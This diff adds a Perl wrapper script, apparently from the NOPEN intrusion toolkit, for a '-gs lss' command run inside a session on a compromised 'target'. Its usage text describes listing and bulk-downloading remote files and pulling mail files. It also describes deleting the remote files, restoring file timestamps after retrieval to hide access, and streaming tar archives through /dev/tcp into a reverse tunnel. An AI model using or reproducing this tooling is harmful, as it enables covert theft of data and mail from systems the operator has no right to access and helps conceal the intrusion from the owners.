@@ -1,0 +1,229 @@
+#!/usr/bin/env perl
+##
+# This should have almost no logic in it. Put it all in autoutils:nopenlss(),
+
+$VER="1.6.0.20";
+#TODO: -lss runs echo on target? wtf? pclean
+$| = 1 ;
+
+myinit() ;
+
+my ($output,$nopenlines,@output) = nopenlss(@ARGV);
+
+#bg("output=$output==\noutput=(
+#.join("\n",@output)."
+#
+#openlines=$nopenlines=
+#");
+
+## END MAIN ##
+
+sub myinit {
+  $willautoport=1;
+  my $autoutils = "../etc/autoutils" ;
+  unless (-e $autoutils) {
+    $autoutils = "/current/etc/autoutils" ;
+   }
+  require $autoutils;
+  $prog = "-gs lss";
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session with \"$prog\".
+
+";
+
+  $gsusagetext = "
+Usage: -gs lss [LSS OPTS] [-ls opts] REMOTEPATH [REMOTEPATH2 [MORE...]]
+
+-gs lss uses NOPEN built-in -ls, with any -ls options provided, on the target
+REMOTPATHs given, saving the output to a temporary local file. That local
+file is then sorted by timestamp using lsstamp.
+
+Note that $prog uses the autoutils function nopenlss(), which can be called
+form other automated auto* scripts just as autolss does, to include with any
+of the LSS options shown below.
+
+NOTE: $prog (and nopenlss()) are -gs rsync aware. If $prog pulls files
+  from a target for which -gs rsync is used during the same op, then $prog
+  will NOT DOWNLOAD any target files that otherwise would match if they
+  already appear in the target's via-gs.rsync directory. Just be sure to
+  have the rsync data fully unpacked before beginning pulls with $prog -G.
+";
+  $gsusagetext .= "
+The -ls OPTION -x[mac] MM-DD-YYYY, if used, MUST be the last option on
+$prog command line before the PATH(s).
+" unless ($ARGV[0] eq "-H");
+  $gsusagetext .= "
+-ls OPTIONS (-x[mac] MM-DD-YYYY, if used, MUST be last option (prior to
+            PATH arguments) on $prog command line):
+  -1        Only the filename shows on each line$COLOR_FAILURE (DO NOT USE WITH -lss)$COLOR_NORMAL
+  -c        Show ctime (default is mtime)
+  -d        Only show that inode, not its contents (even if it is a directory)
+  -h        Show human readable sizes (this is removed by -lss sometimes)
+  -i        Show inode number as well$COLOR_FAILURE (DO NOT USE WITH -lss)$COLOR_NORMAL
+  -R        Recurse listing, showing all subdirectories
+  -t        Sort listing by time (-lss defaults to this anyway)
+  -u        Show atime (default is mtime)
+  -x[m|a|c] MM-DD-YYYY   Show only files dated on/after this date
+"
+    if ($ARGV[0] eq "-H");
+  local $doesanyoneusethis = "
+  -L        Skip the sorting by lsstamp
+
+or want this:
+
+  -6           When -g/-V grepping, ensure the target file path is the only
+               thing we grep on, not the remainder 
+
+
+";
+  $gsusagetext .= "
+LSS OPTIONS
+  -h/H/v       Show short/long usage or version (long includes -ls options).
+  -f file      Save output to local file (still shown on stdout).
+  -F           Show files only (no dirs or specials).
+  -g [I:]exps  ONLY show/download files whose -ls listing (to include
+               permissions, ownership, datestamp) matches any of the \",,\"
+               delimited perl regular expressions provided (unless -V
+               excludes them).
+  -m min       Only show/download files of at least min bytes (implies -F).
+  -M max       Only show/download files of at most max bytes (implies -F).
+  -O file      Save output using -cmdout (preserves all three timestamps).
+  -P           Look in PATH directories for the target files (like which).
+  -S date      Will list(or -chili, or -get) only files at most this old
+               (date format is MM-DD-YYYY). Think of this as the -STOP date
+               (-xm MM-DD-YYYY, an -ls option, is the start date).
+  -U           Do NOT re-use the target -ls of this/these PATHs if done
+               before (otherwise, if the same PATHs are given later in the
+               same order, the old -ls output will be re-used by default).
+  -V [I:]exps  DO NOT show/download files whose -ls listing (to include
+               permissions, ownership, datestamp) matches any of the \",,\"
+               delimited perl regular expressions provided.
+  -w/W         Implies -P, -w looks for files beginning with the target
+               strings, and -W looks for files containing the target strings.
+  -z           Provide sum of all file sizes.
+  -Z           Do not show/download empty files (implies -F).
+
+  NOTEs on  1: Optional I: makes the match is case insensitive.
+    -g/-V   2: For -V and -g, if \"exprs\" is a local file, its content
+               will be used as the list of regular expressions, one per line.
+
+LSS GET OPTIONS (ignored without -G)
+  -4           BETA-BUGGY-NOT-WORKING-YET: DO NOT USE UNLESS DIRECTED TO
+               Use a remote tar command redirected to /dev/tcp/127.0.0.1/PORT
+               on target, which will be accepted/unarchived by a local netcat on
+               that port that is piped to an untar command. Requires a second
+               window on same target to run the return tunnel pastables.
+  -5 PORT      Use a fixed, already established, reverse tunnel on PORT, allows
+               several -lss -G4 pulls via tar to all use the same tunnel.
+  -8           In -G/get mode, we use -ls -n before and then -touch -t after files
+               are pulled to preserve the original mtime and atime. 
+  -b head|tail Get the \"head\" or \"tail\" -M max bytes of each file.
+  -C CHILIARGS Chili mode--use lss to find/filter mail files, then run -chili
+               on the list that results. Using the -l option is normally how we
+               use -lss -C (-chili mode lss). You should very rarely omit the -l.
+               With -l, $prog uses the -lss local directory option:
+                          -L $opdown/mailpull/\$NOPEN_RHOSTNAME.
+               The -C option requires use of the -x[mac] -ls option, which is used
+               for both the -ls and the -chili date option. The CHILIARGS are
+               required and must be other -chili arguments, WITH NO SPACES, or
+               simply \"X\" if there are no other options you want to give -chili:
+                             -s1-m50000
+                             -ls1
+                             -l
+                             X
+               CHILIARGS syntax (remember, no spaces when used with -lss):
+                         [-l][-slines][-mmax]
+  -D           After -ls is complete (even if you choose to -get nothing),
+               offer to$COLOR_FAILURE REMOVE THE REMOTE FILES$COLOR_NORMAL just listed (and possibly
+               retrieved). If target files are not in a hidden directory,
+               you will have several layers of confirmation to get through.
+  -E str       After -get is complete, tar up the files just retrieved in a
+               file beginning with \"str\" in $opdir, and popup a window
+               offering to copy_fast the data immediately.
+  -G           After sorted -ls is shown, option to download (implies -F).
+  -k           Keep original order, useful to preserve priority with -l file.
+  -K[0]        Skip any file download where some previously -lss downloaded
+               file is identical (uses target \"cksum\" binary once PER FILE,
+               and implies/forces -o) and instead make a local copy by that
+               name. Add the optional -0 (zero) option to skip making the local
+               duplicate file.
+  -l file      Use the local file--the files/paths in there become your PATH
+               arguments. Each line can be output from a -ls or a find or a
+               -get command--the path, starting with /, will be used, but IT
+               MUST be the only or final field on the line. Further, if there
+               is a -x[mac] MM-DD-YYYY or -[mac] MM-DD-YYYY timestamp prior
+               to the path on the line, that timestamp is used as an -ls
+               option with that path, (always with mtime by default). I.e.,
+               this can be in your -l file:
+                      -get -l -m 05-05-2005 /path/to/file
+               and it results in this -ls populating your -lss:
+                      -ls -xm 05-05-2005 /path/to/file
+  -L DIR       Use -get -l to put the files into local DIR (with -lcd DIR).
+               Either DIR must exist, or it can be \"NOSEND\" to indicate that
+               behavior (making ./down/NOSEND/\$nopen_rhostname if needed).
+  -N           Skip prompts for deleting, but only if in hidden directory.
+  -o           If getting files, get exactly one at a time. Otherwise, $prog
+               will put several files on each command line. Using -o is a good
+               idea if most the files are large and you are using -T.
+  -p           Do NOT use -oget to pull the remainder of files where our
+               local copy is smaller than that on target. (Default does)
+  -q           Tag the SINGLE directory being pulled as a MYSQL forum (forces
+               -LNOSENDMYSQLForum in the proper direcotry name format)
+  -r           FORCE duplicate -gets from previous target downloads or
+               rsyncs (default will not pull file a second time).
+  -s N,M       Split the pull M ways, this window is N of M. Lets
+               simultaneous and identical $prog commands share the load.
+  -T max       Stop pulling files when the bwmonitor reaches max Megabytes.
+               (See also touch comment below.)
+  -Y           Eliminate prompt about download and just do it.
+
+NOTE: Use this local touch to stop all -lss -G sessions running
+      (after the current -get finishes, see -o above):
+
+   -lsh touch $optmp/StopLSSnow
+
+Usage: -gs lss [LSS OPTS] [-ls opts] REMOTEPATH [REMOTEPATH2 [MORE...]]
+
+";
+my $newmaybe = "
+  -B str       Anchor each -V/-g regular expression so this string PRECEEDS
+               each regular expression. E.g., \"-a /\" forces each expression
+               to occur at the BEGINNING of some directory or filename.
+  -A str       Anchor each -V/-g regular expression so this string FOLLOWS
+               each regular expression. E.g., \"-A \$\" forces each expression
+               to occur at the END OF A LINE.
+";
+my $notshown = " TOOK THIS OUT OF USAGE NO NEED/deprecated:
+
+  -P           Popup files pulled (careful with large counts)
+
+
+  -Q           Quiet mode, when nopenlss() is called from another function,
+               this returns but does not show the final result. -Q is
+               ignored by $prog.
+
+";
+  # Handle single help/version args here, otherwise 
+  # give global ARGV to noepnlss() to handle with Getopts.
+  $opt_v = $ARGV[0] eq "-v";
+  usage() if ($ARGV[0] eq "--help" or
+	      $ARGV[0] eq "-help" or
+	      $ARGV[0] eq "-h" or
+	      $ARGV[0] eq "-H" or
+	      $ARGV[0] eq "--version" or
+	      $ARGV[0] eq "-v");
+  undef $opt_v;
+  $socket = pilotstart(quiet);
+
+} #myinit
+
